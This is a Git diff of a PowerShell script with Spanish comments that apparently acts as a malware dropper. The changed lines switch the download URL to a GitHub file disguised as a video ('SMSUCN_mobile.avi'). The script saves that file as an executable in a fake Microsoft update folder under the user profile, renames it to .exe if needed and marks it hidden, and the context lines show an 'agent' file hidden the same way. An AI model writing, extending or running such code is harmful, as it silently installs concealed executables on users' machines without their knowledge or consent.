@@ -36,12 +36,12 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 
 # Copy Ejecuter
 $rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
-$urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
+$urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN_mobile.avi"
 if (-not (Test-Path $rutaLocalEjecuter)) {
     Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
 }
 if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.exe") {
-    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.exe'
+    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN_mobile.avi', 'SMSUCN.exe'
     Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
 }
 $atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
